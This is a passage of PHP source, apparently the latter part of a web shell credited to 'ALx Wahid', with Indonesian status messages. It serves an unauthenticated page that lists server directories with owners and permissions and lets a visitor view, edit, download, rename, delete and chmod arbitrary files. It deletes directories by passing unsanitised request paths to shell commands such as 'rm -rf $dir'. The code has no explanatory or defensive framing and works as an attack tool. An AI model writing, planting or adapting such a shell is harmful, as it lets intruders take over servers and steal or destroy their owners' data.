	echo "".$act."<br>";
	}
	echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=etcv&dir=$dir&file=".$_GET['file']."'><b>etc</b></a> ] [ <a href='?act=rename_dir&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=delete_dir&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod_dir">
<input type="submit" value="Go" />
</form>';	
	
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=etcv&dir=$dir&file=".$_GET['file']."'>etc</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
	
} elseif($_GET['act'] == 'chmodx') {	
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=etcv&dir=$dir&file=".$_GET['file']."'><b>etc</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
	
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=blue>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=etcv&dir=$dir&file=".$_GET['file']."'>etc</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=blue>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=etcv&dir=$dir&file=".$_GET['file']."'>etc</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=etcv&dir=$dir/$dirx'>etc</a> | <a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=etcv&dir=$dir&file=$dir/$file'>etc</a> | <a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
	echo "<center>Database: ".date("D/M/Y")." - <a href='http://alxwahid.blogspot.pe/' target='_blank'><font color=red>ALx Wahid</font></a></center>";
}
?>
</html>
